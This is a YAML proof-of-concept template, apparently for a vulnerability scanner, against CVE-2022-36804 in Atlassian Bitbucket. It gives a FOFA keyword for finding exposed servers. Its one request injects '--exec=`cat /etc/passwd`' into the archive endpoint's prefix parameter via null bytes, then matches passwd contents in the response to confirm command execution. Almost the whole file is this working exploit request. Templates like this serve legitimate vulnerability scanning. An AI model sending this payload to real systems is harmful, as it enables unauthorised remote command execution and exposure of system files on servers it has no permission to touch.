name: poc-yaml-atlassian-bitbucket-archive-cve-2022-36804-remote-command-exec
binding: 5bb47e4b-c972-44e4-80f4-e064c98d4c85
manual: true
detail:
    author: Cysec
    links:
        - http://wiki.peiqi.tech/wiki/webapp/Atlassian%20Bitbucket/Atlassian%20Bitbucket%20archive%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-36804.html
    vulnerability:
        id: CT-478520
        level: high
    fofakeyword: app="ATLASSIAN-Bitbucket"
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /rest/api/latest/projects/BIZEE/repos/bizee-communication-api/archive?filename=wN3Am&at=wN3Am&path=wN3Am&prefix=ax%00--exec=%60cat%20/etc/passwd%60%00--remote=origin
            follow_redirects: true
        expression: response.status == 500 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
